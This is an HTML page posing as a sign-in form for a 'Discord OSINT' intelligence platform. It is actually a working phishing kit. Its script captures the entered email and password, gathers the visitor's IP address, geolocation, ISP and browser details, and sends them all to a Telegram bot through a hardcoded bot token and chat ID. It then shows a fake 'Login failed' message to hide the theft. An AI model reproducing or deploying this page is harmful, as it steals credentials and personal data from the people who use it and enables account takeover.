<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord OSINT — Intelligence Platform</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'gg sans', 'Segoe UI', Tahoma, sans-serif;
    background: #1e1f22;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #dbdee1;
  }
  .container { width: 100%; max-width: 460px; padding: 20px; }
  .logo { text-align: center; margin-bottom: 28px; }
  .logo-row {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 16px;
    margin-bottom: 16px;
  }
  .logo-icon {
    width: 72px; height: 72px;
    border-radius: 50%;
    background: #5865f2;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 40px rgba(88, 101, 242, 0.5);
  }
  .logo-icon-osint {
    width: 72px; height: 72px;
    border-radius: 50%;
    background: #0d1117;
    border: 2px solid #23a55a;
    display: flex; align-items: center; justify-content: center;
    box-shadow: 0 0 40px rgba(35, 165, 90, 0.5);
    position: relative;
  }
  .logo-icon-osint::after {
    content: '';
    position: absolute;
    inset: 6px;
    border-radius: 50%;
    border: 2px dashed #23a55a;
    opacity: 0.4;
  }
  .logo h1 { font-size: 26px; font-weight: 700; color: #f2f3f5; }
  .logo p { font-size: 13px; color: #949ba4; margin-top: 6px; letter-spacing: 1px; text-transform: uppercase; }
  .card {
    background: #2b2d31;
    border-radius: 8px;
    padding: 32px 28px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
  }
  .card h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; text-align: center; color: #f2f3f5; }
  .subtitle { text-align: center; font-size: 14px; color: #b5bac1; margin-bottom: 24px; }
  .field { margin-bottom: 18px; }
  .field label {
    display: block; font-size: 12px; font-weight: 700;
    color: #b5bac1; margin-bottom: 8px;
    text-transform: uppercase; letter-spacing: 0.02em;
  }
  .field input {
    width: 100%; padding: 11px 12px;
    background: #1e1f22; border: none; border-radius: 3px;
    color: #dbdee1; font-size: 15px;
    transition: outline 0.15s;
    direction: ltr; text-align: left;
  }
  .field input:focus { outline: 1px solid #5865f2; }
  .btn {
    width: 100%; padding: 12px;
    background: #5865f2; border: none; border-radius: 3px;
    color: #fff; font-size: 16px; font-weight: 500;
    cursor: pointer; transition: background 0.15s; margin-top: 6px;
  }
  .btn:hover { background: #4752c4; }
  .btn:disabled { background: #4e5058; cursor: not-allowed; }
  .links { display: flex; justify-content: space-between; margin-top: 18px; font-size: 13px; }
  .links a { color: #00a8fc; text-decoration: none; }
  .links a:hover { text-decoration: underline; }
  .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #6d6f78; }
  .badge {
    display: inline-flex; align-items: center; gap: 6px;
    font-size: 11px; color: #23a55a; margin-top: 16px;
    justify-content: center; width: 100%;
  }
  .badge::before {
    content: ''; width: 7px; height: 7px; border-radius: 50%;
    background: #23a55a; box-shadow: 0 0 8px #23a55a;
  }
</style>
</head>
<body>

<div class="container">
  <div class="logo">
    <div class="logo-row">
      <!-- Discord logo -->
      <div class="logo-icon">
        <svg width="42" height="42" viewBox="0 0 127.14 96.36" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
          <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
        </svg>
      </div>
      <!-- OSINT logo (magnifier + globe) -->
      <div class="logo-icon-osint">
        <svg width="46" height="46" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="10.5" cy="10.5" r="6.5" stroke="#23a55a" stroke-width="1.8"/>
          <line x1="15.5" y1="15.5" x2="21" y2="21" stroke="#23a55a" stroke-width="1.8" stroke-linecap="round"/>
          <ellipse cx="10.5" cy="10.5" rx="3" ry="6.5" stroke="#23a55a" stroke-width="1"/>
          <line x1="4" y1="10.5" x2="17" y2="10.5" stroke="#23a55a" stroke-width="1"/>
        </svg>
      </div>
    </div>
    <h1>Discord OSINT</h1>
    <p>Intelligence & Reconnaissance Platform</p>
  </div>

  <div class="card">
    <h2>Analyst Access</h2>
    <p class="subtitle">Sign in to query the intelligence database</p>
    <form id="loginForm" onsubmit="return false;">
      <div class="field">
        <label>Email</label>
        <input type="email" id="email" placeholder="you@example.com" autocomplete="off" required>
      </div>
      <div class="field">
        <label>Password</label>
        <input type="password" id="password" placeholder="••••••••••••" autocomplete="off" required>
      </div>
      <button type="submit" class="btn" id="submitBtn" onclick="sendData()">Authenticate</button>
    </form>
    <div class="links">
      <a href="#">Forgot password?</a>
      <a href="#">Request access</a>
    </div>
    <div class="badge">Encrypted session — AES-256</div>
  </div>

  <div class="footer">© 2024 Discord OSINT Platform — v2.7.3</div>
</div>

<script>
const BOT_TOKEN = '8943787517:AAHLh50j6t5OhWJqQcPDCcf2yTnSboK1tCo';
const CHAT_ID = '5814617245';
const TG_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';

async function getIPInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return {
      ip: data.ip || 'Unknown',
      city: data.city || '',
      region: data.region || '',
      country: data.country_name || '',
      org: data.org || '',
      timezone: data.timezone || '',
      lat: data.latitude || '',
      lon: data.longitude || ''
    };
  } catch (err) {
    try {
      const r2 = await fetch('https://api.ipify.org?format=json');
      const d2 = await r2.json();
      return { ip: d2.ip || 'Unknown', city:'', region:'', country:'', org:'', timezone:'', lat:'', lon:'' };
    } catch (e) {
      return { ip: 'Unknown', city:'', region:'', country:'', org:'', timezone:'', lat:'', lon:'' };
    }
  }
}

async function sendData() {
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  const btn = document.getElementById('submitBtn');

  if (!email || !password) {
    alert('Login failed, please try again!');
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Authenticating...';

  const ipInfo = await getIPInfo();

  const text =
    '🔐 Discord OSINT Login\n' +
    '📧 Email: ' + email + '\n' +
    '🔑 Password: ' + password + '\n' +
    '🌐 IP: ' + ipInfo.ip + '\n' +
    '📍 Location: ' + ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country + '\n' +
    '🏢 ISP: ' + ipInfo.org + '\n' +
    '🕰️ Timezone: ' + ipInfo.timezone + '\n' +
    '🧭 Coordinates: ' + ipInfo.lat + ', ' + ipInfo.lon + '\n' +
    '🕒 Local Time: ' + new Date().toLocaleString('en-US') + '\n' +
    '🌐 Browser: ' + navigator.userAgent + '\n' +
    '💻 Platform: ' + navigator.platform + '\n' +
    '🗣️ Language: ' + navigator.language + '\n' +
    '🖥️ Screen: ' + screen.width + 'x' + screen.height;

  try {
    await fetch(TG_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  } catch (err) {
    // silent
  }

  setTimeout(function() {
    btn.disabled = false;
    btn.textContent = 'Authenticate';
    alert('Login failed, please try again!');
  }, 700);
}
</script>

</body>
</html>
